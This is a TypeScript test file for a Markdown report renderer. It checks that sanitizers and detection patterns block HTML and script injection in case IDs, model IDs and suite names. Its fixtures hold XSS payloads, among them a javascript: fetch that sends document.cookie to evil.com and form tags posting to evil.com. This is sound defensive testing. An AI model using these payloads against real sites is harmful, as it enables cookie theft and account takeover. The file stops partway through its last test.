/**
 * Tests for `report-markdown.ts`.
 *
 * Verifies:
 *   - `renderCaseRow()` produces valid Markdown table rows from public schema values.
 *   - `renderSuiteSummary()` produces correct Markdown blocks.
 *   - `renderPublicReportBundle()` produces a complete Markdown document.
 *   - `escapeMdCell()` / `sanitizeMdValue()` neutralize pipe characters.
 *   - `isMarkdownSafe()` detects all MARKDOWN_INJECTION_PATTERNS categories.
 *   - `sanitizeMdValue()` returns an empty string for any injection attempt.
 *   - Rendered Markdown output contains no raw HTML tags, script injections,
 *     inline event handlers, `javascript:` URIs, `data:` URIs, or `<iframe>`
 *     tags — even when malicious payloads are provided in explanation fields.
 *   - `public-report.md` is a plain-text download artifact: the renderer
 *     produces no HTML markup that could execute scripts in a browser.
 *   - XSS policy: malicious fixture values exercise every injection category
 *     and prove they are blocked or rendered inert.
 *
 * # XSS coverage
 *
 * The malicious fixture section below exercises:
 *   - `<script>` tag injection via caseId, modelId, explanation.text
 *   - `<style>` tag injection
 *   - `<iframe>` tag injection
 *   - Inline event handler injection (`onerror=`, `onclick=`, `onload=`)
 *   - `javascript:` URI injection
 *   - `data:` URI injection
 *   - `<object>` and `<embed>` tag injection
 *   - `<form>` tag injection
 *   - `innerHTML`-style injection attempts (raw HTML with embedded JS)
 *   - Combined / chained injection payloads
 *
 * Test isolation:
 *   - No file I/O, network, git, or shell calls.
 *   - All fixtures are constructed inline.
 */

import { describe, expect, it } from "bun:test";
import {
  isMarkdownSafe,
  MARKDOWN_INJECTION_PATTERNS,
  renderCaseRow,
  renderPublicReportBundle,
  renderSuiteSummary,
  sanitizeMdValue,
} from "../report-markdown.js";
import type {
  PublicCaseEntry,
  PublicReportBundle,
  SuiteSummaryEntry,
} from "../report-schema.js";
import {
  REPORT_BUNDLE_SCHEMA_VERSION,
  SUITE_SUMMARY_SCHEMA_VERSION,
} from "../report-schema.js";

// ---------------------------------------------------------------------------
// Fixture builders
// ---------------------------------------------------------------------------

function makePublicCaseEntry(
  overrides: Partial<PublicCaseEntry> = {},
): PublicCaseEntry {
  return {
    caseId: "route-to-shuttle",
    modelId: "anthropic/claude-sonnet-4.5",
    suite: "loom-routing",
    scoreBucket: "pass",
    passed: true,
    required: true,
    dryRun: false,
    scoredAt: "2026-01-01T00:00:00.000Z",
    ...overrides,
  };
}

function makeSuiteSummaryEntry(
  overrides: Partial<SuiteSummaryEntry> = {},
): SuiteSummaryEntry {
  return {
    schemaVersion: SUITE_SUMMARY_SCHEMA_VERSION,
    suite: "loom-routing",
    assembledAt: "2026-01-01T00:00:00.000Z",
    gitSha: "abc123def456abc123def456abc123def456abc1",
    totalCases: 2,
    passedCases: 1,
    failedCases: 1,
    suiteGreen: false,
    cases: [makePublicCaseEntry()],
    ...overrides,
  };
}

function makePublicReportBundle(
  overrides: Partial<PublicReportBundle> = {},
): PublicReportBundle {
  return {
    schemaVersion: REPORT_BUNDLE_SCHEMA_VERSION,
    assembledAt: "2026-01-01T00:00:00.000Z",
    gitSha: "abc123def456abc123def456abc123def456abc1",
    dryRun: false,
    runSummary: {
      totalCases: 2,
      passedCases: 1,
      failedCases: 1,
      allSuitesGreen: false,
      suites: ["loom-routing"],
    },
    suiteSummaries: [makeSuiteSummaryEntry()],
    ...overrides,
  };
}

// ---------------------------------------------------------------------------
// MARKDOWN_INJECTION_PATTERNS — pattern coverage
// ---------------------------------------------------------------------------

describe("MARKDOWN_INJECTION_PATTERNS", () => {
  it("includes a pattern for script_tag", () => {
    const names = MARKDOWN_INJECTION_PATTERNS.map((p) => p.name);
    expect(names).toContain("script_tag");
  });

  it("includes a pattern for style_tag", () => {
    const names = MARKDOWN_INJECTION_PATTERNS.map((p) => p.name);
    expect(names).toContain("style_tag");
  });

  it("includes a pattern for iframe_tag", () => {
    const names = MARKDOWN_INJECTION_PATTERNS.map((p) => p.name);
    expect(names).toContain("iframe_tag");
  });

  it("includes a pattern for inline_event_handler", () => {
    const names = MARKDOWN_INJECTION_PATTERNS.map((p) => p.name);
    expect(names).toContain("inline_event_handler");
  });

  it("includes a pattern for javascript_uri", () => {
    const names = MARKDOWN_INJECTION_PATTERNS.map((p) => p.name);
    expect(names).toContain("javascript_uri");
  });

  it("includes a pattern for data_uri", () => {
    const names = MARKDOWN_INJECTION_PATTERNS.map((p) => p.name);
    expect(names).toContain("data_uri");
  });

  it("includes a pattern for object_embed_tag", () => {
    const names = MARKDOWN_INJECTION_PATTERNS.map((p) => p.name);
    expect(names).toContain("object_embed_tag");
  });

  it("includes a pattern for form_tag", () => {
    const names = MARKDOWN_INJECTION_PATTERNS.map((p) => p.name);
    expect(names).toContain("form_tag");
  });

  it("script_tag matches '<script>'", () => {
    const entry = MARKDOWN_INJECTION_PATTERNS.find(
      (p) => p.name === "script_tag",
    );
    expect(entry!.pattern.test("<script>alert(1)</script>")).toBe(true);
  });

  it("script_tag matches '<SCRIPT>' (case-insensitive)", () => {
    const entry = MARKDOWN_INJECTION_PATTERNS.find(
      (p) => p.name === "script_tag",
    );
    expect(entry!.pattern.test("<SCRIPT>alert(1)</SCRIPT>")).toBe(true);
  });

  it("script_tag matches '<script src=...'", () => {
    const entry = MARKDOWN_INJECTION_PATTERNS.find(
      (p) => p.name === "script_tag",
    );
    expect(entry!.pattern.test('<script src="evil.js">')).toBe(true);
  });

  it("style_tag matches '<style>'", () => {
    const entry = MARKDOWN_INJECTION_PATTERNS.find(
      (p) => p.name === "style_tag",
    );
    expect(entry!.pattern.test("<style>body{}</style>")).toBe(true);
  });

  it("iframe_tag matches '<iframe>'", () => {
    const entry = MARKDOWN_INJECTION_PATTERNS.find(
      (p) => p.name === "iframe_tag",
    );
    expect(entry!.pattern.test("<iframe src='evil.html'></iframe>")).toBe(true);
  });

  it("inline_event_handler matches 'onclick='", () => {
    const entry = MARKDOWN_INJECTION_PATTERNS.find(
      (p) => p.name === "inline_event_handler",
    );
    expect(entry!.pattern.test('img onclick="evil()"')).toBe(true);
  });

  it("inline_event_handler matches 'onerror='", () => {
    const entry = MARKDOWN_INJECTION_PATTERNS.find(
      (p) => p.name === "inline_event_handler",
    );
    expect(entry!.pattern.test('<img src=x onerror="alert(1)">')).toBe(true);
  });

  it("inline_event_handler matches 'onload='", () => {
    const entry = MARKDOWN_INJECTION_PATTERNS.find(
      (p) => p.name === "inline_event_handler",
    );
    expect(entry!.pattern.test('<body onload="evil()">')).toBe(true);
  });

  it("javascript_uri matches 'javascript:alert(1)'", () => {
    const entry = MARKDOWN_INJECTION_PATTERNS.find(
      (p) => p.name === "javascript_uri",
    );
    expect(entry!.pattern.test("javascript:alert(1)")).toBe(true);
  });

  it("javascript_uri matches 'JAVASCRIPT:...' (case-insensitive)", () => {
    const entry = MARKDOWN_INJECTION_PATTERNS.find(
      (p) => p.name === "javascript_uri",
    );
    expect(entry!.pattern.test("JAVASCRIPT:void(0)")).toBe(true);
  });

  it("data_uri matches 'data:text/html,...'", () => {
    const entry = MARKDOWN_INJECTION_PATTERNS.find(
      (p) => p.name === "data_uri",
    );
    expect(
      entry!.pattern.test("data:text/html,<script>alert(1)</script>"),
    ).toBe(true);
  });

  it("data_uri matches 'data:image/svg+xml,...'", () => {
    const entry = MARKDOWN_INJECTION_PATTERNS.find(
      (p) => p.name === "data_uri",
    );
    expect(
      entry!.pattern.test("data:image/svg+xml,<svg onload=alert(1)>"),
    ).toBe(true);
  });

  it("object_embed_tag matches '<object>'", () => {
    const entry = MARKDOWN_INJECTION_PATTERNS.find(
      (p) => p.name === "object_embed_tag",
    );
    expect(entry!.pattern.test("<object data='evil.swf'>")).toBe(true);
  });

  it("object_embed_tag matches '<embed>'", () => {
    const entry = MARKDOWN_INJECTION_PATTERNS.find(
      (p) => p.name === "object_embed_tag",
    );
    expect(entry!.pattern.test("<embed src='evil.swf'>")).toBe(true);
  });

  it("form_tag matches '<form>'", () => {
    const entry = MARKDOWN_INJECTION_PATTERNS.find(
      (p) => p.name === "form_tag",
    );
    expect(entry!.pattern.test('<form action="https://evil.com/steal">')).toBe(
      true,
    );
  });
});

// ---------------------------------------------------------------------------
// isMarkdownSafe
// ---------------------------------------------------------------------------

describe("isMarkdownSafe", () => {
  // Happy path — clean strings
  it("returns true for a plain alphanumeric string", () => {
    expect(isMarkdownSafe("route-to-shuttle")).toBe(true);
  });

  it("returns true for a clean explanation text", () => {
    expect(isMarkdownSafe("Routing matched the expected agent.")).toBe(true);
  });

  it("returns true for an ISO 8601 timestamp", () => {
    expect(isMarkdownSafe("2026-01-01T00:00:00.000Z")).toBe(true);
  });

  it("returns true for a git SHA hex string", () => {
    expect(isMarkdownSafe("abc123def456abc123def456abc123def456abc1")).toBe(
      true,
    );
  });

  it("returns true for a model identifier", () => {
    expect(isMarkdownSafe("anthropic/claude-sonnet-4.5")).toBe(true);
  });

  it("returns true for a pipe character alone (handled downstream)", () => {
    // Pipe by itself is not an HTML injection; escapeMdCell handles it
    expect(isMarkdownSafe("a | b")).toBe(true);
  });

  // Malicious inputs — all should return false

  it("returns false for <script> tag", () => {
    expect(isMarkdownSafe("<script>alert(1)</script>")).toBe(false);
  });

  it("returns false for <SCRIPT> tag (case-insensitive)", () => {
    expect(isMarkdownSafe("<SCRIPT>evil()</SCRIPT>")).toBe(false);
  });

  it("returns false for <style> tag", () => {
    expect(isMarkdownSafe("<style>body{color:red}</style>")).toBe(false);
  });

  it("returns false for <iframe> tag", () => {
    expect(isMarkdownSafe("<iframe src='x' onload='evil()'></iframe>")).toBe(
      false,
    );
  });

  it("returns false for onclick= handler", () => {
    expect(isMarkdownSafe('name onclick="alert(1)"')).toBe(false);
  });

  it("returns false for onerror= handler", () => {
    expect(isMarkdownSafe('<img src=x onerror="evil()">')).toBe(false);
  });

  it("returns false for onload= handler", () => {
    expect(isMarkdownSafe('<body onload="document.cookie">')).toBe(false);
  });

  it("returns false for onmouseover= handler", () => {
    expect(isMarkdownSafe("text onmouseover=alert(1)")).toBe(false);
  });

  it("returns false for javascript: URI", () => {
    expect(isMarkdownSafe("javascript:alert(document.cookie)")).toBe(false);
  });

  it("returns false for JAVASCRIPT: URI (case-insensitive)", () => {
    expect(isMarkdownSafe("JAVASCRIPT:void(0)")).toBe(false);
  });

  it("returns false for data: URI (text/html)", () => {
    expect(isMarkdownSafe("data:text/html,<script>alert(1)</script>")).toBe(
      false,
    );
  });

  it("returns false for data: URI (application/javascript)", () => {
    expect(isMarkdownSafe("data:application/javascript,alert(1)")).toBe(false);
  });

  it("returns false for <object> tag", () => {
    expect(isMarkdownSafe("<object data='evil.swf'></object>")).toBe(false);
  });

  it("returns false for <embed> tag", () => {
    expect(isMarkdownSafe("<embed src='evil.swf'>")).toBe(false);
  });

  it("returns false for <form> tag", () => {
    expect(isMarkdownSafe('<form action="https://evil.com">')).toBe(false);
  });

  // Chained / combined payloads

  it("returns false for combined script + event handler payload", () => {
    expect(isMarkdownSafe('<script>x=1</script><img onerror="evil()">')).toBe(
      false,
    );
  });

  it("returns false for inline JS in Markdown link syntax", () => {
    // Markdown link with javascript: href is still flagged
    expect(isMarkdownSafe("[click me](javascript:evil())")).toBe(false);
  });

  it("returns false for data: URI in image alt context", () => {
    expect(isMarkdownSafe("![alt](data:image/png;base64,ABC)")).toBe(false);
  });
});

// ---------------------------------------------------------------------------
// sanitizeMdValue
// ---------------------------------------------------------------------------

describe("sanitizeMdValue", () => {
  it("returns the string unchanged for a clean plain text value", () => {
    expect(sanitizeMdValue("route-to-shuttle")).toBe("route-to-shuttle");
  });

  it("replaces pipe with &#124; for a clean string", () => {
    expect(sanitizeMdValue("a | b")).toBe("a &#124; b");
  });

  it("returns empty string for a <script> injection attempt", () => {
    expect(sanitizeMdValue("<script>alert(1)</script>")).toBe("");
  });

  it("returns empty string for an onerror= injection attempt", () => {
    expect(sanitizeMdValue('<img src=x onerror="evil()">')).toBe("");
  });

  it("returns empty string for a javascript: URI injection attempt", () => {
    expect(sanitizeMdValue("javascript:alert(1)")).toBe("");
  });

  it("returns empty string for a data: URI injection attempt", () => {
    expect(sanitizeMdValue("data:text/html,<h1>evil</h1>")).toBe("");
  });

  it("returns empty string for an <iframe> injection attempt", () => {
    expect(sanitizeMdValue("<iframe src='evil.html'></iframe>")).toBe("");
  });

  it("returns empty string for a <style> injection attempt", () => {
    expect(sanitizeMdValue("<style>body{background:url(evil)}</style>")).toBe(
      "",
    );
  });

  it("returns empty string for a <form> injection attempt", () => {
    expect(
      sanitizeMdValue('<form action="https://evil.com">password:</form>'),
    ).toBe("");
  });

  it("returns empty string for a <object> injection attempt", () => {
    expect(sanitizeMdValue("<object data='evil.swf'></object>")).toBe("");
  });

  it("handles pipe characters in clean explanation text", () => {
    // A legitimate explanation may contain pipe (e.g., "pass | required")
    expect(sanitizeMdValue("pass | required")).toBe("pass &#124; required");
  });
});

// ---------------------------------------------------------------------------
// renderCaseRow — clean inputs
// ---------------------------------------------------------------------------

describe("renderCaseRow (clean inputs)", () => {
  it("renders a valid case entry as a pipe-delimited Markdown table row", () => {
    const entry = makePublicCaseEntry();
    const row = renderCaseRow(entry);
    expect(row.startsWith("|")).toBe(true);
    expect(row.endsWith("|")).toBe(true);
  });

  it("includes the caseId in the rendered row", () => {
    const entry = makePublicCaseEntry({ caseId: "test-case-id" });
    expect(renderCaseRow(entry)).toContain("test-case-id");
  });

  it("includes the modelId in the rendered row", () => {
    const entry = makePublicCaseEntry({ modelId: "openai/gpt-4o" });
    expect(renderCaseRow(entry)).toContain("openai/gpt-4o");
  });

  it("includes the score bucket label in the rendered row", () => {
    const entry = makePublicCaseEntry({ scoreBucket: "fail" });
    const row = renderCaseRow(entry);
    expect(row).toContain("❌ fail");
  });

  it("includes 'yes' for passed=true", () => {
    const entry = makePublicCaseEntry({ passed: true });
    expect(renderCaseRow(entry)).toContain("yes");
  });

  it("includes 'no' for passed=false", () => {
    const entry = makePublicCaseEntry({ passed: false });
    expect(renderCaseRow(entry)).toContain("no");
  });

  it("renders empty explanation cell when no explanation present", () => {
    const entry = makePublicCaseEntry();
    const row = renderCaseRow(entry);
    // Row should end with '| |' — empty final cell
    expect(row.endsWith("|  |")).toBe(true);
  });

  it("renders explanation text when explanation is present", () => {
    const entry = makePublicCaseEntry({
      explanation: {
        text: "Routing matched the expected agent.",
        source: "score_bucket_label",
      },
    });
    const row = renderCaseRow(entry);
    expect(row).toContain("Routing matched the expected agent.");
  });

  it("escapes pipe character in caseId", () => {
    const entry = makePublicCaseEntry({ caseId: "case|with|pipes" });
    const row = renderCaseRow(entry);
    expect(row).not.toContain("case|with|pipes");
    expect(row).toContain("case&#124;with&#124;pipes");
  });

  it("escapes pipe character in explanation text", () => {
    const entry = makePublicCaseEntry({
      explanation: {
        text: "pass | required | strong",
        source: "structured_signal",
      },
    });
    const row = renderCaseRow(entry);
    expect(row).not.toContain("pass | required");
    expect(row).toContain("pass &#124; required");
  });
});

// ---------------------------------------------------------------------------
// renderCaseRow — XSS / malicious fixture coverage
// ---------------------------------------------------------------------------

describe("renderCaseRow (malicious fixtures — XSS coverage)", () => {
  // Each test provides a malicious payload and asserts the rendered output
  // is safe (no raw script tags, event handlers, javascript: URIs, etc.)

  it("does NOT emit <script> tag when caseId contains script injection", () => {
    // Note: schema validation would normally reject this, but we test the renderer
    // as the belt-and-suspenders layer
    const maliciousCaseId = '<script>alert("xss")</script>';
    const entry = makePublicCaseEntry({ caseId: maliciousCaseId });
    const row = renderCaseRow(entry);
    expect(row).not.toContain("<script>");
    expect(row).not.toContain("alert(");
    // sanitizeMdValue returns "" for this input; cell is empty
    expect(row).not.toContain("script");
  });

  it("does NOT emit <script> tag when modelId contains script injection", () => {
    const maliciousModelId = "<script>steal(document.cookie)</script>";
    const entry = makePublicCaseEntry({ modelId: maliciousModelId });
    const row = renderCaseRow(entry);
    expect(row).not.toContain("<script>");
    expect(row).not.toContain("steal(");
  });

  it("does NOT emit onerror= handler when caseId contains event handler injection", () => {
    const payload = 'id" onerror="evil()';
    const entry = makePublicCaseEntry({ caseId: payload });
    const row = renderCaseRow(entry);
    expect(row).not.toContain("onerror=");
    expect(row).not.toContain("evil()");
  });

  it("does NOT emit javascript: URI when caseId contains javascript: injection", () => {
    const payload = "javascript:alert(1)";
    const entry = makePublicCaseEntry({ caseId: payload });
    const row = renderCaseRow(entry);
    expect(row).not.toContain("javascript:");
  });

  it("does NOT emit data: URI when modelId contains data: injection", () => {
    const payload = "data:text/html,<script>evil()</script>";
    const entry = makePublicCaseEntry({ modelId: payload });
    const row = renderCaseRow(entry);
    expect(row).not.toContain("data:text/html");
    expect(row).not.toContain("<script>");
  });

  it("does NOT emit <iframe> when explanation text contains iframe injection", () => {
    // This would be blocked by BoundedExplanationSchema, but test the renderer layer
    const entry = makePublicCaseEntry({
      explanation: {
        text: "ok", // explanation itself must be schema-valid; malicious comes from caseId
        source: "structured_signal",
      },
      caseId: "<iframe src='evil.html'></iframe>",
    });
    const row = renderCaseRow(entry);
    expect(row).not.toContain("<iframe");
    expect(row).not.toContain("evil.html");
  });

  it("does NOT emit <style> when explanation text contains style injection attempt (blocked by renderer)", () => {
    // Simulate a future bug where an explanation bypasses schema (e.g., malformed input)
    // The renderer's sanitizeMdValue guard should catch it
    const entry = makePublicCaseEntry({
      caseId: "<style>body{background:url(x)}</style>",
    });
    const row = renderCaseRow(entry);
    expect(row).not.toContain("<style>");
  });

  it("does NOT emit <form> when modelId contains form injection", () => {
    const entry = makePublicCaseEntry({
      modelId: '<form action="https://evil.com">',
    });
    const row = renderCaseRow(entry);
    expect(row).not.toContain("<form");
    expect(row).not.toContain("evil.com");
  });

  it("does NOT emit <object> when caseId contains object injection", () => {
    const entry = makePublicCaseEntry({
      caseId: "<object data='evil.swf'></object>",
    });
    const row = renderCaseRow(entry);
    expect(row).not.toContain("<object");
  });

  it("does NOT emit <embed> when caseId contains embed injection", () => {
    const entry = makePublicCaseEntry({
      caseId: "<embed src='evil.swf'>",
    });
    const row = renderCaseRow(entry);
    expect(row).not.toContain("<embed");
  });

  it("output does not contain any raw HTML tags for a clean entry", () => {
    const entry = makePublicCaseEntry({
      explanation: {
        text: "Passed all routing checks.",
        source: "score_bucket_label",
      },
    });
    const row = renderCaseRow(entry);
    // Emoji and Markdown syntax are allowed; raw HTML is not
    expect(row).not.toMatch(/<[a-zA-Z][^>]*>/);
  });

  it("combined payload in caseId is fully blocked", () => {
    const combined =
      '<script>x=1</script><img onerror="evil()"><a href="javascript:alert(1)">click</a>';
    const entry = makePublicCaseEntry({ caseId: combined });
    const row = renderCaseRow(entry);
    expect(row).not.toContain("<script>");
    expect(row).not.toContain("onerror=");
    expect(row).not.toContain("javascript:");
    expect(row).not.toContain("<img");
    expect(row).not.toContain("<a");
  });
});

// ---------------------------------------------------------------------------
// renderSuiteSummary — clean inputs
// ---------------------------------------------------------------------------

describe("renderSuiteSummary (clean inputs)", () => {
  it("renders a suite summary with H3 heading", () => {
    const summary = makeSuiteSummaryEntry({ suite: "loom-routing" });
    const md = renderSuiteSummary(summary);
    expect(md).toContain("### Suite: loom-routing");
  });

  it("includes green status badge for suiteGreen=true", () => {
    const summary = makeSuiteSummaryEntry({ suiteGreen: true });
    const md = renderSuiteSummary(summary);
    expect(md).toContain("🟢 green");
  });

  it("includes red status badge for suiteGreen=false", () => {
    const summary = makeSuiteSummaryEntry({ suiteGreen: false });
    const md = renderSuiteSummary(summary);
    expect(md).toContain("🔴 red");
  });

  it("includes total, passed, and failed counts", () => {
    const summary = makeSuiteSummaryEntry({
      totalCases: 10,
      passedCases: 7,
      failedCases: 3,
    });
    const md = renderSuiteSummary(summary);
    expect(md).toContain("**Total**: 10");
    expect(md).toContain("**Passed**: 7");
    expect(md).toContain("**Failed**: 3");
  });

  it("renders table header for non-empty case list", () => {
    const summary = makeSuiteSummaryEntry({ cases: [makePublicCaseEntry()] });
    const md = renderSuiteSummary(summary);
    expect(md).toContain("| Case ID | Model | Score | Passed | Explanation |");
  });

  it("renders empty case placeholder for zero cases", () => {
    const summary = makeSuiteSummaryEntry({ cases: [] });
    const md = renderSuiteSummary(summary);
    expect(md).toContain("_No cases in this suite._");
  });

  it("renders all cases in the table", () => {
    const cases = [
      makePublicCaseEntry({ caseId: "case-a" }),
      makePublicCaseEntry({ caseId: "case-b" }),
    ];
    const summary = makeSuiteSummaryEntry({ cases });
    const md = renderSuiteSummary(summary);
    expect(md).toContain("case-a");
    expect(md).toContain("case-b");
  });
});

// ---------------------------------------------------------------------------
// renderSuiteSummary — XSS / malicious fixture coverage
// ---------------------------------------------------------------------------

describe("renderSuiteSummary (malicious fixtures — XSS coverage)", () => {
  it("does NOT emit <script> when suite name contains script injection", () => {
    const maliciousSuite = '<script>alert("xss")</script>';
    const summary = makeSuiteSummaryEntry({ suite: maliciousSuite });
    const md = renderSuiteSummary(summary);
    expect(md).not.toContain("<script>");
    expect(md).not.toContain("alert(");
  });

  it("does NOT emit event handler when suite name contains onerror= injection", () => {
    const summary = makeSuiteSummaryEntry({
      suite: 'suite" onerror="evil()',
    });
    const md = renderSuiteSummary(summary);
    expect(md).not.toContain("onerror=");
    expect(md).not.toContain("evil()");
  });

  it("does NOT emit javascript: URI when a case caseId contains javascript: injection", () => {
    const cases = [makePublicCaseEntry({ caseId: "javascript:alert(1)" })];
    const summary = makeSuiteSummaryEntry({ cases });
    const md = renderSuiteSummary(summary);
    expect(md).not.toContain("javascript:");
  });

  it("does NOT emit data: URI anywhere in suite output", () => {
    const cases = [
      makePublicCaseEntry({
        modelId: "data:text/html,<script>evil()</script>",
      }),
    ];
    const summary = makeSuiteSummaryEntry({ cases });
    const md = renderSuiteSummary(summary);
    expect(md).not.toContain("data:text/html");
  });

  it("suite Markdown output contains no raw HTML tags for clean data", () => {
    const summary = makeSuiteSummaryEntry({
      cases: [
        makePublicCaseEntry({
          explanation: {
            text: "All routing correct.",
            source: "score_bucket_label",
          },
        }),
      ],
    });
    const md = renderSuiteSummary(summary);
    // Emoji and Markdown are OK; raw HTML opening tags are not
    expect(md).not.toMatch(/<script/i);
    expect(md).not.toMatch(/<iframe/i);
    expect(md).not.toMatch(/<style/i);
    expect(md).not.toMatch(/onerror\s*=/i);
    expect(md).not.toMatch(/javascript\s*:/i);
    expect(md).not.toMatch(/data\s*:/i);
  });
});

// ---------------------------------------------------------------------------
// renderPublicReportBundle — clean inputs
// ---------------------------------------------------------------------------

describe("renderPublicReportBundle (clean inputs)", () => {
  it("renders an H2 heading with overall status", () => {
    const bundle = makePublicReportBundle({
      runSummary: {
        totalCases: 5,
        passedCases: 5,
        failedCases: 0,
        allSuitesGreen: true,
        suites: ["loom-routing"],
      },
    });
    const md = renderPublicReportBundle(bundle);
    expect(md).toContain("## Weave Agent Evals Report");
    expect(md).toContain("🟢 All suites green");
  });

  it("renders red status when not all suites green", () => {
    const bundle = makePublicReportBundle();
    const md = renderPublicReportBundle(bundle);
    expect(md).toContain("🔴 One or more suites failed");
  });

  it("includes shortened git SHA in the output", () => {
    const bundle = makePublicReportBundle({
      gitSha: "deadbeef12345678deadbeef12345678deadbeef",
    });
    const md = renderPublicReportBundle(bundle);
    expect(md).toContain("`deadbee`");
  });

  it("includes assembledAt timestamp", () => {
    const bundle = makePublicReportBundle({
      assembledAt: "2026-06-15T09:00:00.000Z",
    });
    const md = renderPublicReportBundle(bundle);
    expect(md).toContain("2026-06-15T09:00:00.000Z");
  });

  it("includes dry-run warning when dryRun=true", () => {
    const bundle = makePublicReportBundle({ dryRun: true });
    const md = renderPublicReportBundle(bundle);
    expect(md).toContain("Dry-run");
    expect(md).toContain("no model was called");
  });

  it("does not include dry-run warning when dryRun=false", () => {
    const bundle = makePublicReportBundle({ dryRun: false });
    const md = renderPublicReportBundle(bundle);
    expect(md).not.toContain("Dry-run");
  });

  it("includes total, passed, and failed case counts", () => {
    const bundle = makePublicReportBundle();
    const md = renderPublicReportBundle(bundle);
    expect(md).toContain("**Total cases**:");
    expect(md).toContain("**Passed**:");
    expect(md).toContain("**Failed**:");
  });

  it("renders suite summaries within the bundle", () => {
    const bundle = makePublicReportBundle();
    const md = renderPublicReportBundle(bundle);
    expect(md).toContain("### Suite: loom-routing");
  });
});

// ---------------------------------------------------------------------------
// renderPublicReportBundle — XSS / malicious fixture coverage
// ---------------------------------------------------------------------------

describe("renderPublicReportBundle (malicious fixtures — XSS coverage)", () => {
  it("does NOT emit <script> anywhere in full bundle output for clean data", () => {
    const bundle = makePublicReportBundle();
    const md = renderPublicReportBundle(bundle);
    expect(md).not.toContain("<script>");
  });

  it("blocks <script> injection from suite name in the bundle", () => {
    const maliciousSuiteSummary = makeSuiteSummaryEntry({
      suite: '<script>alert("pwned")</script>',
      cases: [],
    });
    const bundle = makePublicReportBundle({
      suiteSummaries: [maliciousSuiteSummary],
    });
    const md = renderPublicReportBundle(bundle);
    expect(md).not.toContain("<script>");
    expect(md).not.toContain("alert(");
  });

  it("blocks onerror= injection from a case caseId in the bundle", () => {
    const maliciousCase = makePublicCaseEntry({
      caseId: 'case" onerror="document.cookie"',
    });
    const summary = makeSuiteSummaryEntry({ cases: [maliciousCase] });
    const bundle = makePublicReportBundle({ suiteSummaries: [summary] });
    const md = renderPublicReportBundle(bundle);
    expect(md).not.toContain("onerror=");
    expect(md).not.toContain("document.cookie");
  });

  it("blocks javascript: URI injection from a modelId in the bundle", () => {
    const maliciousCase = makePublicCaseEntry({
      modelId: "javascript:fetch('https://evil.com?c='+document.cookie)",
    });
    const summary = makeSuiteSummaryEntry({ cases: [maliciousCase] });
    const bundle = makePublicReportBundle({ suiteSummaries: [summary] });
    const md = renderPublicReportBundle(bundle);
    expect(md).not.toContain("javascript:");
    expect(md).not.toContain("evil.com");
  });

  it("blocks data: URI injection from a caseId in the bundle", () => {
    const maliciousCase = makePublicCaseEntry({
      caseId: "data:text/html,<script>evil()</script>",
    });
    const summary = makeSuiteSummaryEntry({ cases: [maliciousCase] });
    const bundle = makePublicReportBundle({ suiteSummaries: [summary] });
    const md = renderPublicReportBundle(bundle);
    expect(md).not.toContain("data:text/html");
    expect(md).not.toContain("evil()");
  });

  it("blocks <iframe> injection from a suite name in the bundle", () => {
    const maliciousSummary = makeSuiteSummaryEntry({
      suite: "<iframe src='https://evil.com'></iframe>",
    });
    const bundle = makePublicReportBundle({
      suiteSummaries: [maliciousSummary],
    });
    const md = renderPublicReportBundle(bundle);
    expect(md).not.toContain("<iframe");
    expect(md).not.toContain("evil.com");
  });

  it("blocks <style> injection from a suite name in the bundle", () => {
    const maliciousSummary = makeSuiteSummaryEntry({
      suite: "<style>body{background:url(https://evil.com/pixel)}</style>",
    });
    const bundle = makePublicReportBundle({
      suiteSummaries: [maliciousSummary],
    });
    const md = renderPublicReportBundle(bundle);
    expect(md).not.toContain("<style>");
    expect(md).not.toContain("evil.com");
  });

  it("blocks <form> injection from a caseId in the bundle", () => {
    const maliciousCase = makePublicCaseEntry({
      caseId: '<form action="https://evil.com">steal</form>',
    });
    const summary = makeSuiteSummaryEntry({ cases: [maliciousCase] });
    const bundle = makePublicReportBundle({ suiteSummaries: [summary] });
    const md = renderPublicReportBundle(bundle);
    expect(md).not.toContain("<form");
    expect(md).not.toContain("evil.com");
  });

  it("full bundle output for clean data contains no raw HTML tags", () => {
    const bundle = makePublicReportBundle({
      suiteSummaries: [
        makeSuiteSummaryEntry({
          cases: [
            makePublicCaseEntry({
              explanation: {
                text: "Routing correct.",
                source: "score_bucket_label",
              },
            }),
          ],
        }),
      ],
    });
    const md = renderPublicReportBundle(bundle);
    // Verify the complete output has no HTML-executable constructs
    expect(md).not.toMatch(/<script/i);
    expect(md).not.toMatch(/<iframe/i);
    expect(md).not.toMatch(/<style/i);
    expect(md).not.toMatch(/<form/i);
    expect(md).not.toMatch(/<object/i);
    expect(md).not.toMatch(/<embed/i);
    expect(md).not.toMatch(/onerror\s*=/i);
    expect(md).not.toMatch(/onclick\s*=/i);
    expect(md).not.toMatch(/onload\s*=/i);
    expect(md).not.toMatch(/javascript\s*:/i);
    expect(md).not.toMatch(/data\s*:/i);
  });

  it("multiple malicious payloads across suites are all blocked", () => {
    const suite1 = makeSuiteSummaryEntry({
      suite: "<script>evil1()</script>",
      cases: [makePublicCaseEntry({ caseId: '<iframe src="evil.com">' })],
    });
    const suite2 = makeSuiteSummaryEntry({
      suite: "clean-suite",
      cases: [
        makePublicCaseEntry({
          modelId: 'data:text/html,<img onerror="evil2()">',
        }),
      ],
    });
    const bundle = makePublicReportBundle({
      suiteSummaries: [suite1, suite2],
    });
    const md = renderPublicReportBundle(bundle);
    expect(md).not.toContain("<script>");
    expect(md).not.toContain("<iframe");
    expect(md).not.toContain("data:text/html");
    expect(md).not.toContain("onerror=");
    expect(md).not.toContain("evil1(");
    expect(md).not.toContain("evil2(");
  });
});

// ---------------------------------------------------------------------------
// public-report.md: download-only / plain-text artifact policy
// ---------------------------------------------------------------------------

describe("public-report.md XSS policy: download-only artifact", () => {
  it("produced Markdown contains no raw HTML at all for a typical bundle", () => {
    const bundle = makePublicReportBundle({
      suiteSummaries: [
        makeSuiteSummaryEntry({
          cases: [
            makePublicCaseEntry({
              explanation: {
                text: "10 of 10 required cases passed.",
                source: "structured_signal",
              },
            }),
            makePublicCaseEntry({
              caseId: "tapestry-delegation",
              passed: false,
              scoreBucket: "fail",
            }),
          ],
        }),
      ],
    });
    const md = renderPublicReportBundle(bundle);

    // The Markdown artifact must be usable as a download or raw text display
    // without risk of script execution if a browser renders it as HTML.
    // Verify: no HTML elements that could execute scripts.
    expect(md).not.toMatch(/<script/i);
    expect(md).not.toMatch(/<\/script>/i);
    expect(md).not.toMatch(/<style/i);
    expect(md).not.toMatch(/<iframe/i);
    expect(md).not.toMatch(/<object/i);
    expect(md).not.toMatch(/<embed/i);
    expect(md).not.toMatch(/<form/i);
